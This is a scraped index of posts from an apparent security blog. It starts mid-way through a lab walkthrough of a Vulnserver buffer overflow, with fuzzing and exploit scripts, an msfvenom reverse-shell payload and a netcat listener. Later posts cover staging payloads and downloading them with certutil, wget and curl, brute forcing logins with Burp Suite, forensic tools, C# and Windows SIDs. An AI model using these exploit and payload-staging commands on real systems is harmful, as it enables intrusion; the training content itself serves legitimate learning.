the following information, the %INPUT% field should be replaced with the application input being tested. s_readline(); s_string(\"%INPUT% \"); s_string_variable(\"0\"); Running the test on TRUN identified a buffer overflow vulnerability. The below screenshot shows the evidence via immunity debugger. Note that the value A is repeated in register EAX and has overflowed into additional registers ESP, EBP, and EIP. The values of EBP and EIP are expressed in Hex equivalent (A = 41). More information on x86 Assembly Language can be found on the Assembly Overview post. Craft overflow content: Having identified that TRUN is vulnerable, the next step is to identify the exact byte count at which the the application crash occurs. A fuzzing script can be written and used against TRUN to step the fuzzing process, the below python script from the TCM Academy - Practical Ethical Hacking course with the slight addition of creating variables for the target values. #!/usr/bin/python3import sys, socketfrom time import sleeptInput = \"TRUN /.:/\"buffer = \"A\" * 100tIp = '%IP%'tPort = %PORT%while True: try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((tIp,tPort)) payload = tInput + buffer s.send((payload.encode())) s.close sleep(1) buffer = buffer + \"A\"*100 except: print (\"Fuzzing crashed at %s bytes\" % str(len(buffer))) sys.exit() Once the script has completed, the byte count will be printed to the terminal. In this example, the application crashed at 3300 bytes and did not overwrite another registers apart from the EAX. The next phase once the byte count has been determined is to identify the memory offset for the EIP register as it is the one in which requires to be overwritten with attacking code. Metasploit contains a module to create a pattern that will be used for the offset. Running the Metasploit module can be achieved via the below command with the switch -l indicating the byte count. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3300 Copy the output of the command, and either create a new Python script or alter the previous one used for the byte count discovery as per the example snippet below. Paste the copied offset string into %OFFSET% and enter the %IP% and %PORT% details. #!/usr/bin/python3 import sys, socket tInput = \"TRUN /.:/\" offset = \"%OFFSET%\" tIp = '%IP%' tPort = %PORT% try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((tIp,tPort)) payload = tInput + offset s.send((payload.encode())) s.close except: print (\"Error connecting to server\") sys.exit() Run the python script and it should again cause the application to crash and identify the EIP register address within the Immunity Debugger output, which can be seen in the below image. Of particular note is the memory address of the EIP which in this example is 386F4337. With the memory address of the EIP register obtained, another metasploit similar to that run to create the offset pattern can be executed to find the exact point in which the EIP is located in the offset code. The Metasploit command is as follows with the switch -l indicating the byte count and -q representing the EIP memory location. Executing the tool will print the offset byte in which the EIP begins, in this example that is after byte 2003. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3300 -q 386F4337 With the EIP identified, it is good practice to first identify any bad characters that could interfere with injected malicious shellcode. This specific example does not require this step, however further details can be found on this Bulb Security post about identifying any bad characters using Immunity Debugger. This section can also be performed after the next step as Mona.py contains a function bytearray to check for bad characters. The next phase of crafting the overflow content is to identify modules or .dll file that do not have any memory protections. Mona.py is a plugin for Immunity Debugger that can be used to identify such modules. After downloading and moving the python script into the C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands directory, restart Immunity Debugger and reattach the Vulnserver application. On the bottom portion of the Immunity Debugger is a command window, enter !mona modules to execute the plugin and run the modules function. Doing so will provide an output similar to that below. Note that the module essFunc.dll returns False against all checks, making it a prime candidate to abuse. With the previously identified module essFunc.dll, there are two other mona.py functions that can be run to identify pointers within the application that reference the module. First, the opcode for JMP ESP must be identified using !mona assemble -s \"JMP ESP\" which will output the opcode \\xff\\xe4. Using this opcode, the pointers can be printed for the module using !mona find -s \"\\xff\\xe4\" -m essfunc.dll. Ultimately, in this example, 9 pointers were identified that can be leveraged along with their attributed return memory addresses as per the image below. Any of the return addresses can be used, however 0x625011d3 is selected for this example. The previous Python script used comes into play once again, this time amending the contents or creating a new python script with the following changes. Note that the pointer variable contains the address 0x625011d3 converted to Hex and presented in little-endian, meaning that the order is reversed, which is a requirement when dealing with application in the x86 format. #!/usr/bin/python3 import sys, socket tInput = b\"TRUN /.:/\" pointer = b\"\\xaf\\x11\\x50\\x62\" nopSled = b\"\\x90\" * 32 # A NOP-sled in the overflow content is used to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs. The multiplication value can be changed. overflow = b\"\" shellcode = b\"A\" * 2003 + pointer + nopSled + overflow tIp = '%IP%' tPort = %PORT% try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((tIp,tPort)) payload = tInput + shellcode s.send((payload)) # Note that encoding has been removed, hence the b is presented prior to variable values to manually encode the values. s.close except: print (\"Error connecting to server\") sys.exit() The Python script sets a jump condition to the ESP register, meaning that the EIP should be set to the memory address 0x625011d3. The last stage is to now inject the malicious shellcode into the buffer overflow to exploit the application. For this example, a reverse TCP shell is being generated via the Metaploit payload generator, Msfvenom, via the below command. Replace the %IP% and %PORT% as necessary. msfvenom -p windows/shell_reverse_rcp LHOST=%IP% LPORT=%PORT% EXITFUNC=thread -f -c -a x86 -b \"\\x00\" The -b switch is used to list bad characters, if there are any additional they should be added. The example above depicts the NULL byte character. Executing the Msfvenom command will output an unsigned char buf string, copy this code and add it to the python script as shown above within the overflow variable. Exploit - The shellcode variable is now structured to complete the exploit. With an open a netcat listener (nc -nvlp &amp;PORT%) on the port chosen, the exploit can be executed with the result being a root shell via the buffer overflow.Sources TCM Academy - Practical Ethical Hacking Hacking - The Art of Exploitation 2nd Edition OWASP - Buffer Overflow Attack Catharsis - Basic Buffer Overflow Guide Bulb Security - Finding Bad Characters with Immunity Debugger and Mona.py CAPEC-100: Overflow Buffers &#8617; " }, { "title": "Building an Ubuntu Host on VMWare", "url": "/posts/Installing_Ubuntu_22.04/", "categories": "General IT and Security, Engineering", "tags": "ubuntu", "date": "2022-09-28 00:00:00 +1000", "snippet": "OverviewUbuntu is a Linux distribution based on Debian and composed mostly of free and open-source software. Ubuntu is officially released in three editions: Desktop, Server, and Core for Internet of things devices and robots. All the editions can run on the computer alone, or in a virtual machine.For the purposes of this instruction, the focus will be on installing Ubuntu 22.04 LTS Server which is a headless (does not have a GUI) version to host various applications and will be hosted on VMWare Workstation/eXSI hypervisors.Note that specific tooling has may not be compatible with recent releases of the Ubuntu OS, therefore check dependencies of your tooling before choosing a version of Ubuntu Server to install.Hardware Dependencies CPU RAM Disk 1+ 1+ 2.5GB+ Installing Ubuntu 22.04 LTS (Server) on VMWare Workstation Download the .ISO file from Ubuntu. Create a new virtual machine within VMWare Workstation, ensuring the following options are chosen or set: ISO Disk: Point to recently downloaded .ISO image for Ubuntu Set appropriate resources for the machine and set network adapter Once resources have been allocated to the VM, you can then proceed through the Ubuntu Server install wizard, selecting the appropriate selections. Highlighted below are a few unique selections with further information, however selecting the defaults will result in a fully function server being created so select those if nothing additional is required. Ensure you note down the username and password set during the wizard. Install Type: New choice available with Ubuntu 22.04, select default selection (Ubuntu Server). Network Connections: If the VM was configured to have connectivity in the previous resource allocation, you can select the adapter and set either DHCP (default) or a static address for the server to utilize. Proxy: Enter the proxy details if the server will sit behind one, this can also be updated post the install if you wish not to configure this just yet. However, if you’re using something like Squid, you can input http://&lt;IP&gt;:&gt;port&gt; to route traffic through the proxy during and after the installation. Open SSH: Enable if you will be accessing this server via SSH. Its recommended to enable this as accessing the server through the VMWare Workstation terminal can be annoying. However, keep in mind that this will need to be hardened or secured as necessary. See Source 2 for 10 tips for hardening SSH. This, along with proxy details can be configured post installation. Reboot when prompted and unmount the .ISO file from the Virtual-CDROM Once rebooted, access the server using the username and password you set during the installation wizard and run an basic update before creating a snapshot or beginning to install your desired server tools. sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt autoremove " }, { "title": "Resource Development", "url": "/posts/Resource_Development/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "resource development (TA0042), acquire infrastructure (T1583), compromise accounts (T1586), compromise infrastructure (T1586), develop capabilities (T1587), establish accounts (T1585), obtain capabilities (T1588), stage capabilities (T1608)", "date": "2022-09-27 00:00:00 +1000", "snippet": "OverviewThe adversary is trying to establish resources they can use to support operations.Resource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion. 1TechniquesResources can be split into distinguishable categories; Infrastructure Physical or Virtualized servers that are stood up to enable an attacker to perform activities. Infrastructure can include infrastructure on cloud service providers, previously compromised infrastructure leveraged for further attacks and specifically created or leased infrastructure. Web Services Services that are offered via third parties. Often these services include cloud storage hosting, remote access subscriptions, and social media platforms. Capabilities Resources that are used during an attack such as tools, malware, digital certificates, exploits, etc. These capabilities can be obtained from existing sources, or developed for more targeted approaches. Staging of resources is also an important consideration for the deployment of malware and other resources that are required to be transferred to targeted hosts. Detection Mitigation Threat Hunting Resource Development techniques are difficult to efficiently track and defend against. However threat hunting tasks such as new domain registration and scans on threat related infrastructure such as Cobalt Strike servers through tools like Shodan can provide early warning detections for potential attack vectors. ToolsThere are various tools and services for the establishment of infrastructure. For more verbose procedures to carry out some of the techniques, see the Resource Development - Capabilities post.Sources MITRE ATT&amp;CK - Resource Development TA0042 &#8617; " }, { "title": "Obtain, Develop and Stage Capabilities", "url": "/posts/Capabilities/", "categories": "Ethical Hacking Tools, Stage Capabilities", "tags": "stage capabilities (T1608), obtain capabilities (T1588), develop capabilities (T1587), powershell, bash, certutil.exe, python, wget, curl, invoke-webrequest", "date": "2022-09-27 00:00:00 +1000", "snippet": "OverviewObtaining, Developing and Staging capabilities or resources is an integral part of attack Planning and Reconnaissance. Ensuring that capabilities are setup and configured prior to launching an attack on a target and providing various supporting mechanisms across the different attack phases. Capabilities can include tool deployment, server initialization and configuration, malware creation and resource hosting.Obtaining CapabilitiesAdversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.Penetration Testing SuitesThere are two main distributions that come pre-packaged with various tools in support of penetration testing activities. A custom environment can also be created to aid in what ever tasks that are planning to be carried out. Kali Linux Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering. ParrotOS Parrot Security provides a huge arsenal of tools, utilities and libraries that IT and security professionals can use to test and assess the security of their assets in a reliable, compliant and reproducible way. From information gathering to the final report. The Parrot system gets you covered with the most flexible environment.Developing CapabilitiesAdversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.Malware Development with MSFvenomSources Offensive Security - Metasploit Unleashed (Msfvenom)Staging CapabilitiesHosting Resources via a Python HTTP ServerPython is able to be used to host a HTTP web server in order to serve resources that can be downloaded remotely via a target system. Create a local folder to host files and resources Open a terminal windows and navigate to the previously created directory Establish a web server using python via the following command, replace %PORT% with the desired port to host the server on. python3 -m simpleHTTPServer %PORT% Downloading Hosted ResourcesThere are various ways to download the resources on a target host via the aforementioned Python HTTP Server. Some of the more common and easier methods are belowWindows Certutil.exe certutil.exe -urlcache -f http://%IPADDRESS%:%PORT%/%RESOURCE% %OUTPUT% Invoke-WebRequest (Wget) Invoke-WebRequest -Method Get -Url http://%IPADDRESS%:%PORT%/%RESOURCE% -OutFile %OUTPUT% Linux Wget wget -O %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE% Curl curl -o %OUTPUT% http://%IPADDRESS%:%PORT%/%RESOURCE% " }, { "title": "BurpSuite", "url": "/posts/BurpSuite/", "categories": "Ethical Hacking Tools, Frameworks and Suites", "tags": "burpsuite, credential access (TA0006), brute force (T1110)", "date": "2022-09-27 00:00:00 +1000", "snippet": "OverviewBurp Suite is a Java application that can be used to secure or penetrate web applications. It comes pre-installed on Kali Linux and ParrotOS, however can be installed on your operating system of choice via the community edition download on their website. The suite consists of different tools, such as: Spider: Crawls target web applications in an attempt to map functionalities and potential vulnerabilities. Proxy: Intercepts traffic between the attacking and target system and allows for the content of requests and responses to be altered while in transit. Intruder: Allows input fuzzing for proxied traffic. Common uses include brute-forcing directories and credentials. Repeater: Allows for requests to be manually altered and forwarded to the web app. Sequencer: An entropy checker that checks for the randomness of tokens generated by the webserver. These tokens are generally used for authentication in sensitive operations: cookies and anti-CSRF tokens are examples of such tokens. Decoder: Lists the common encoding methods like URL, HTML, Base64, Hex, etc. This tool comes handy when looking for chunks of data in values of parameters or headers. It is also used for payload construction for various vulnerability classes. Scanner: Not available in the community edition, however it scans website for vulnerabilities. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Burpsuite Community Edition V2022.8.4 Credential Access Brute Force Setting the Browser to Proxy TrafficThe web browser must first be configured to proxy traffic to Burp in order to intercept traffic. The below example shows the configuration for the Mozilla Plugin FoxyProxy. Download and install FoxyProxy from https://getfoxyproxy.org/. Create a new proxy profile, set the Proxy IP address to 127.0.0.1 and the port to 8080. Enable the proxy in the web browser to allow Burpsuite to intercept the traffic. Open Burpsuite and navigate to the Proxy Tab, select the sub-tab Intercept and enable Interception via the Intercept is off button. Burpsuite proxy settings can be amended via the Proxy tab, Options sub-tab under the Proxy Listeners section.Brute Forcing WebApp CredentialsTo brute force potential credentials for a webapp, Burpsuite can be used to fuzz username and password fields. With Burpsuite intercepting traffic, attempt to enter credentials (application defaults are always a good start). In the example below the request has been intercepted and shows two fields of interest, j_username and j_password which can be fuzzed. Send the request to the Intruder via right clicking in the Raw text box and selecting Send to Intruder or using the hotkey Ctrl+I. Automatic detection of possible fields to fuzz will be detected, however in some cases will provide more fields than necessary. The automatic selections can be cleared and target fields added. The below shows fields for the username and password highlighted and the selections available for the attack type. Select the Payloads sub-tab within Intruder, it will bring up the payload options where word lists or manual entries can be added for both of the selected username and password fields. Note that in the first section, Payload Sets, there is a dropdown selection for which payload set to updated. 1 is linked to the username and 2 is linked to the password selections from the step previous. In the below example, 6 usernames have been manually input along with a list of 4 potential passwords. As Cluster Bomb was selected as the attack type, each username and password combination will be attempted equaling a total of 24 requests. Click the Start Attack button, BurpSuite will begin to run through the lists and provide a running log of attempts. Take note of the output Status Codes and Response Lengths to highlight any potentially valid credentials. In the example below, jenkins:jenkins was an outlier, returning a different length response from the other attempts which could indicate that its a valid credential set. " }, { "title": "JumpListExplorer (JLE)", "url": "/posts/DFIR_Tools_Execution_JLE/", "categories": "DFIR Tools, Program Execution", "tags": "jump list, automaticdestinations, execution (TA0002)", "date": "2022-09-23 00:00:00 +1000", "snippet": "OverviewThe JumpListExplorer (JLE) is a tool that parsers Windows AutomaticDestinations files to provide information relating to application execution. Results are recorded per application Id (AppID) and show folders and applications spawned via a parent application. Eric Zimmerman maintains a repository of common AppID mappings on his GitHub.Parsing the Windows Jump List entries can aid forensic investigations by providing evidence of program execution and file and folder interaction activities. Further information about the Jump List can be found on the Evidence of Execution page.There are two versions of the JLE available, a GUI and a Command Line parser. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Jump List Explorer (JLE GUI) Jump List Explorer Cmd (JLECmd) V1.4.1.0 Execution   InstructionsLoading AutomaticDestinations Files via JumpListExplorer Run JumpListExplorer, the application does not require Administrative permissions Select menu option File and Load Jump Lists, navigate to the directory containing the automaticDestinations files you wish to parse. If running the tool on a live system, automaticDestinations files are stored in the following directory by default C:%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations Select a single or multiple automaticDestinations files and select Open.OutputInteresting Fields TargetCreationDate TargetModificationDate TargetLastAccessedDate LocalPath Interaction count" }, { "title": "Registry Explorer", "url": "/posts/DFIR_Tools_Toolkits_RegistryExplorer/", "categories": "DFIR Tools, Toolkits", "tags": "registry, amcache, bam, dam, lastvisitedmru, ntuser.dat, execution (TA0002)", "date": "2022-09-21 00:00:00 +1000", "snippet": "OverviewRegistry Explorer allows Windows registry hives to be interrogated and parsed for a wide variety of forensic artifacts. The tool comes in two versions, a GUI and a commandline interface. Eric Zimmerman has created several plugins that allow automated parsing for certain forensic objects. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Registry Explorer (RECmd) Registry Explorer (GUI) V1.6.0.0 Execution Persistence Defense Evasion Credential Access   InstructionsLoading a Hosts Registry via Registry Explorer Run RegistryExplorer.exe as an Administrator if interrogating a live host Hive Selection Live Host: Navigate to menu option File and Live System and then select the desired registry hive Registry Dump: Navigate to menu option Load Hive and navigate to the desired registry hive via Explorer. Hive details can be exported to several formats via the menu option File and ExportParsing the AmCache.hve for Evidence of ExecutionInteresting Keys Root\\ InventoryDeviceContainer: OS devices such as bluetooth, printers, etc. Has links to DevicePnps InventoryDevicePnP: Plug and Play (PnP) devices such as bluetooth, USB, etc. More verbose details than those contained in DeviceContainers InventoryDriverBinary: System Drivers InventoryDriverPackage: Package information that links to both DeviceContainers and DevicePnPs InventoryApplicationShortcut: .LNK files Parsing the BAM/DAM for Evidence of Execution Execution Time is a reference to the last execution time.Parsing the LastVisitedMRU for Evidence of ExecutionInteresting Fields Executable: Records the parent application Absolute Path: Records the file opened Opened On: Date-time-group of last access timeParsing the ShimCache (AppCompatCache) for Evidence of ExecutionInteresting Fields Program Name: Records the full executable filepath Modified Time: Date-time-group of last access time" }, { "title": "AmcacheParser", "url": "/posts/DFIR_Tools_Execution_AmCacheParser/", "categories": "DFIR Tools, Program Execution", "tags": "amcache, execution (TA0002)", "date": "2022-09-21 00:00:00 +1000", "snippet": "OverviewAmcacheParser different from other Amcache parsers in that it does not dump everything available. Rather, it looks at both File entries and Program entries.Program entries are found under Root\\Programs and File entries are found under Root\\File.AmcacheParser gathers information about all the Program entries, then looks at all the File entries. In each file entry is a pointer to a Program ID (value 100). If this Program ID exists in Program entries, the File entry is associated with the Program entry.At the end of this process you are left with things that didn’t come from some kind of installed application.Using the minimum options, AmcacheParser will only export Unassociated file entries. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique AmCacheParser V1.5.1.0 Execution   InstructionsExtracting Application Data from a Live HostThe AmCache Parser can be deployed onto a host system to extract hive details. If a forensic image or copy of the amcache.hve file has been collected, the tool csn also parse these in place of live extraction.amcacheparser.exe -f \"C:\\Path\\To\\amcache.hve\" --csv \"C:\\Path\\To\\Output\" must be run as Administrator in order to interrogate the live hive.Extracting Application Data with Exclusion List Post-processingAmCache Parser allows for exclusion lists to be configured during processing of the hive data. The format should be in the form of a new line separate .txt document containing single SHA1 hash entries for all applications wishing to be excluded from the results. This is a great option to minimize results for common or expected applications.amcacheparser.exe -f \"C:\\Path\\To\\amcache.hve\" -w \"C:\\Path\\To\\Exclusions.txt\" --csv \"C:\\Path\\To\\Output\" must be run as Administrator in order to interrogate the live hive.OutputDeviceContainersContains a list of OS devices such as bluetooth, printers, etc. Has links to DevicePnpsDevicePnPsContains a list of Plug and Play devices such as bluetooth, USB, etc. More verbose details than those contained in DeviceContainersDriveBinariesContains a list of driversDriverPackagesContains of list of package information that links to both DeviceContainers and DevicePnPsShortCutsContains a listing of identified .LNK filesUnassociatedFileEntriesContains a list of file entries that are unassociated with an installer. The command switch -i can be added to the execution command to include all file entries." }, { "title": "WxTcmd", "url": "/posts/DFIR_Tools_Execution_WxTcmd/", "categories": "DFIR Tools, Program Execution", "tags": "wxtcmd, activitiescache, execution (T0002)", "date": "2022-09-19 00:00:00 +1000", "snippet": "OverviewWxTcmd is a tool used to parse the SQLite ActivitiesCache.db file to provide forensic evidence of execution and file interaction. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique WxTCmd V0.6.0.0 Execution   InstructionsExtracting the ActivitiesCache.db file to a CSVThe ActivitiesCache database is stored under the userprofile and can be copied from the directory C:\\Users\\%USERPROFILE%\\AppData\\Local\\ConnectedDevicesPlatform\\L.%USERPROFILE%\\ActivitiesCache.dbWxTcmd.exe -f 'C:\\Path\\To\\ActivitiesCache.db' --csv 'C:\\Path\\To\\Output'OutputTwo .csv files will be output to the location succeeding the --csv parameter; Activity.csv Contains verbose details for accessed files and program execution such as executable name, filepath, Explorer search terms, and timestamps including a duration count. Activity_PackageIDs.csv Contains a smaller subset of data and can provide full filepath for recently executed applications. " }, { "title": "C# Overview", "url": "/posts/C-_Overview/", "categories": "General IT and Security, Programming", "tags": "c#", "date": "2022-09-17 00:00:00 +1000", "snippet": "OverviewOOP is the foundation of many development languages, building classes and organizing the code into a structured way.  Many approaches, patterns and architectures are compatible with OOP. Learning the fundamentals of programming in OOP will allow a security analyst to have a greater understanding of how executable files are constructed and give huge insight when starting to delve into the world of Reverse Engineering and Malware Analysis. There are many OOP languages including JavaScript, C++, Java, Python and C#, for this post we will focus on C#.C# leverages the Microsoft .NET framework, It is made up of a family of products including the runtime, compilers, and common code libraries. The code libraries provide a lot of reusable core functionality that can be used directly in a program. The most common library used is the ‘System’ library which allows applications to interact with the underlying system.The general focus of developing an application using OOP is an iterative process and will not always logically flow between stages one after the other. Generally, the stages include: Identifying Classes Separating Responsibilities Establishing Relationships Leveraging ReuseClasses and ObjectsOOP is used to structure a software application into simple, reusable pieces of code blueprints, called classes, which are used to created individual instances of objects, an example of this can be seen below accompanying the descriptions of each term. Classes: A class is a concept used in OOP languages that provides values for state (member variables) and implementations of behavior (member functions, methods) in programs. A class is defined as a blueprint of an object, an extensible guide used for creating objects. A class does not represent and object; it represents all the information and methods an object should have. The below code snippet is an example of a class, called ‘Darkcybe’ which contains a method called ‘mainMethod’ which invokes the .NET ‘Console.WriteLine’ method to print ‘var1’ to the console. Class Darkcybe { Public static void mainMethod(string[] args) { String var1 = \"var1Value\"; Console.WriteLine(var1); } } Objects: An object is defined as an entity that can be utilized by using commands in a programming language. An object can be a variable, value, data structure or function. In OOP, an object is referred to as an instance of a class. An object contains properties and methods which are needed to make a certain type of data useful.MethodsUnlike other programming languages, C# does not use functions, however uses something similar called methods. A method cannot exist without a class in, therefore the class created in the above example ‘Darkcybe’ houses a static method called ‘mainMethod’. Camel case is generally used for the Class and method name, whilst little camel case is used for the argument names. A Method generally contains one or more statements which are the basic unit of execution of a program.Access ModifiersAn item of note within Methods are Access Modifiers, of which there are six. The example above uses the ‘Public’ access modifier listed before the static modifier. The static modifiers purpose is purely to ensure that each instance created under the ‘Darkcybe’ class will belong to the class itself, not the object of the class. Keyword Description Public Accessible without restriction from within a project Private Only accessible inside a class Protected Accessible inside a class or in all classes derived from that class Internal Accessible only to the current assembly Protected Internal A combination of Protected and Internal, can only be accessed in the same assembly or in a derived class in other assemblies. Private Protected A combination of Private and Protected, accessible only by members inside of a containing class or in a class that derives from a containing class. Data TypesVariables in C# are categorized into three difference types which define the type of data being represented by the variable. Ensuring the correct type is implied is important when coding application in C#. For reference tin the above code excerpt, the type ‘Void’ (an example of a reference type) declares that the entire method does not have an assigned type. Keyword Description Value Assigned a direct value and are derived from the class ‘System.ValueType’. Value types contain numerical, alphabetical for floating point numbers. There are multiple types of data which can be assigned as per the ‘Value Data Types’ table below. Reference Reference types do not contain actual data, rather they contain a reference to the variable that does. References can be to either an object, a string or dynamic. Pointer Pointers store memory addresses of another type. Value Data Types Keyword Description Range Data Example bool Boolean value True or False   byte 8-bit unsigned integer 0 to 255   char Stores a single character/letter, surrounded by single quotes U +0000 to U +ffff ‘A’ decimal 128-bit precise decimal values with 28-29 significant digits (-7.9 x 1028 to 7.9 x 1028) / 100 to 28 10.1 double Stores fractional numbers. Sufficient for storing 15 decimal points (+/-)5.0 x 10-324 to (+/-)1.7 x 10308   float Stores fractional numbers. Sufficient for storing 6 to 7 decimal digits -3.4 x 1038 to + 3.4 x 1038 ﻿ int Stores whole numbers -2,147,483,648 to 2,147,483,647 10 long Stores long whole numbers -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807   sbyte 8-bit signed integer type -128 to 127   short 16-bit signed integer type -32,768 to 32,767   uint 32-bit unsigned integer type 0 to 4,294,967,295   ulong 64-bit unsigned integer type 0 to 18,446,744,073,709,551,615   ushort 16-bit unsigned integer type 0 to 65,535   String Stores a sequence of characters, surrounded by double quotes   “string” StatementsStatements are the core component of a programs execution, the logic behind what operations are conducted. There are a few different types of statements that are used in C#, the above code example showcases the use of a Declaration statement to assign the value of ‘var1calue’ to the variable ‘var1’ and print it to the console. Statements are written using Keywords and Expressions to perform operations. Keyword Description Statement Example Selection Enables logical branches to different sections of code depending one one nor more specific conditions. if (condition) { do something }switch (example) { case &lt;1: do this; break; } Iternation Enables code to loop through collections such as arrays or perform the same set of statement repeatedly until a specified condition is met foreach (item in list) { do something }int d = 999;while ( d &lt; 999) { do this; d++; } Declaration Used to declare and initialize variables string darkcybe; Expression Calculate a value and must store the value in a variable int sum = 900 + 99; Exception Handling Enable graceful recovery from exceptional conditions that occur at run time. try { this } catch { stop }throw [e]; Jump Transfer control to another section of code. break;goto section2; Expressions and OperatorsExpressions are similar to statements however are not executable on their own, statements use expressions and keywords in order to give expressions meaning in to operationalize them. Operators are useful keys that allow operations to be performed on variables and values. There are several different categories that operators are broken into; Arithmetic, Relational/Comparison, Logical, Bitwise, Assignment and Miscellaneous. An operator performs an action to one or more operands.Arithmetic Operators Operator Description Data Example + Adds two operands A + B = 30 - Subtracts second operand from the first A - B = -10 * Multiplies both operands A * B = 200 / Divides numerator by de-numerator B / A = 2 % Modulus Operator and remainder of after an integer division B % A = 0 ++ Increment operator increases integer value by one A++ = 11 – Decrement operator decreases integer value by one A– = 9 Relational/Comparison Operators Operator Description Data Example == Checks if the values of two operands are equal or not, if yes then condition becomes true. (A == B) is not true. != Checks if the values of two operands are equal or not, if values are not equal then condition becomes true. (A != B) is true. &gt; Checks if the value of left operand is greater than the value of right operand, if yes then condition becomes true. (A &gt; B) is not true. &lt; Checks if the value of left operand is less than the value of right operand, if yes then condition becomes true. (A &lt; B) is true. &gt;= Checks if the value of left operand is greater than or equal to the value of right operand, if yes then condition becomes true. (A &gt;= B) is not true. &lt;= Checks if the value of left operand is less than or equal to the value of right operand, if yes then condition becomes true. (A &lt;= B) is true. Logical Operators Operator Description Data Example &amp;&amp; Called Logical AND operator. If both the operands are non zero then condition becomes true. (A &amp;&amp; B) is false. || Called Logical OR Operator. If any of the two operands is non zero then condition becomes true. (A || B) is true. ! Called Logical NOT Operator. Use to reverses the logical state of its operand. If a condition is true then Logical NOT operator will make false. !(A &amp;&amp; B) is true. Bitwise Operators Operator Description Data Example &amp; Binary AND Operator copies a bit to the result if it exists in both operands. (A &amp; B) = 12, which is 0000 1100 | Binary OR Operator copies a bit if it exists in either operand. (A | B) = 61, which is 0011 1101 ^ Binary XOR Operator copies the bit if it is set in one operand but not both. (A ^ B) = 49, which is 0011 0001 ~ Binary Ones Complement Operator is unary and has the effect of ‘flipping’ bits. (~A ) = -61, which is 1100 0011 in 2’s complement due to a signed binary number. « Binary Left Shift Operator. The left operands value is moved left by the number of bits specified by the right operand. A « 2 = 240, which is 1111 0000 » Binary Right Shift Operator. The left operands value is moved right by the number of bits specified by the right operand. A » 2 = 15, which is 0000 1111 Assignment Operators Operator Description Data Example = Simple assignment operator, Assigns values from right side operands to left side operand C = A + B assigns value of A + B into C += Add AND assignment operator, It adds right operand to the left operand and assign the result to left operand C += A is equivalent to C = C + A -= Subtract AND assignment operator, It subtracts right operand from the left operand and assign the result to left operand C -= A is equivalent to C = C - A *= Multiply AND assignment operator, It multiplies right operand with the left operand and assign the result to left operand C *= A is equivalent to C = C * A /= Divide AND assignment operator, It divides left operand with the right operand and assign the result to left operand C /= A is equivalent to C = C / A %= Modulus AND assignment operator, It takes modulus using two operands and assign the result to left operand C %= A is equivalent to C = C % A «= Left shift AND assignment operator C «= 2 is same as C = C « 2 »= Right shift AND assignment operator C »= 2 is same as C = C » 2 &amp;= Bitwise AND assignment operator C &amp;= 2 is same as C = C &amp; 2 ^= bitwise exclusive OR and assignment operator C ^= 2 is same as C = C ^ 2 |= bitwise inclusive OR and assignment operator C |= 2 is same as C = C | 2 Miscellaneous Operators Operator Description Data Example sizeof() Returns the size of a data type. sizeof(int), returns 4. typeof() Returns the type of a class. typeof(StreamReader); &amp; Returns the address of an variable. &amp;a; returns actual address of the variable. * Pointer to a variable. *a; creates pointer named ‘a’ to a variable. ? : Conditional Expression If Condition is true ? Then value X : Otherwise value Y is Determines whether an object is of a certain type. If( Ford is Car) // checks if Ford is an object of the Car class. as Cast without raising an exception if the cast fails. Object obj = new StringReader(“Hello”); StringReader r = obj as StringReader; Sources Tutorials Point - C Sharp W3 Schools - CS Microsoft - Dotnet Framework Microsoft - C Sharp" }, { "title": "Windows Security and Relative Identifiers (SIDS and RIDS)", "url": "/posts/Windows_SID_RID/", "categories": "General IT and Security, Deep Dives", "tags": "sid, rid", "date": "2022-09-17 00:00:00 +1000", "snippet": "OverviewDuring analysis of suspected or known breaches, the use of these identifiers can assist in various ways. One of the most common is looking for processes, including legitimate ones, that originate from incorrect file paths or running under the wrong account. This does delve into knowing common processes and being able to identified expected behaviors from those that may be malicious.Security and Relative Identifiers (SID/RID) are utilized by Active Directory to identify objects known as Security Principals which include Users, Computers, and Groups. A SID value is constructed in several components with the RID being one of the more important components.Breaking Down SIDSThe above image depicts a the whoami /all command being run via the command prompt on a Windows Server. The top section depicts the current users SID with the bottom half displaying group SIDs. Below we can see the user SID for the domain user ‘malnet\\administrator’ with a breakdown of the core components.Digging further into these components can help with quickly identifying potentially nefarious behaviors. The following provides more context relating to the various SID components: Literal Prefix: ‘S’ indicates that the string that follows is a SID object, ‘1’ is a revision marker, indicating that this SID is the first revision. Identifier Authority: The issuing authority identification marker (0 - Null, 1 - World, 2 - Local, 3 - Creator, 5 - Security) Sub Authorities: Unique domain or local computer identifier Relative ID: The unique RID attached to the objectWell Known SIDS 